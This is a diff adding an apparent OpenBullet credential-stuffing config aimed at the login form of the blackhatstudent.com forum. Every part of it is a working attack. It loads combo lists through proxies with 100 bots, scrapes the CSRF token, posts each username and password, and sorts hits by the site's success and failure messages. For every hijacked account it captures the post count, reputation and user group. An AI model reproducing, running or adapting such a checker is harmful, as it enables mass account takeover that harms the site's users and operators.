@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "BlackHatStudent",
+  "SuggestedBots": 100,
+  "LastModified": "2018-11-22T03:14:38.8335611+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1018515773
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Gettiing_Token REQUEST GET "http://blackhatstudent.com/member.php?action=login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#BAN? KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+#TOKEN PARSE "<SOURCE>" LR "var my_post_key = \"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#Checking REQUEST POST "http://blackhatstudent.com/member.php" AutoRedirect=TRUE 
+  CONTENT "action=do_login&url=http%3A%2F%2Fblackhatstudent.com%2Findex.php&quick_login=1&my_post_key=<TOKEN>&quick_username=<USER>&submit=Login&quick_password=<PASS>&quick_remember=yes" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: http://blackhatstudent.com/index.php" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination" 
+  KEYCHAIN Success OR 
+    KEY "You have successfully been logged in" 
+#Capture REQUEST GET "http://blackhatstudent.com/usercp.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Posts PARSE "<SOURCE>" REGEX "Posts:<\/strong> <a href=\".*\">([^<]*)" "[1]" Recursive=FALSE -> CAP "Posts" "" "" 
+#Reputation PARSE "<SOURCE>" REGEX "<strong>Reputation:<\/strong>.*\s*<strong class=\".*\">([^<]*)" "[1]" Recursive=FALSE -> CAP "Reputation" "" "" 
+#Group PARSE "<SOURCE>" LR "<strong>Primary User Group:</strong>" "<" Recursive=FALSE -> CAP "User Group" "" "" 
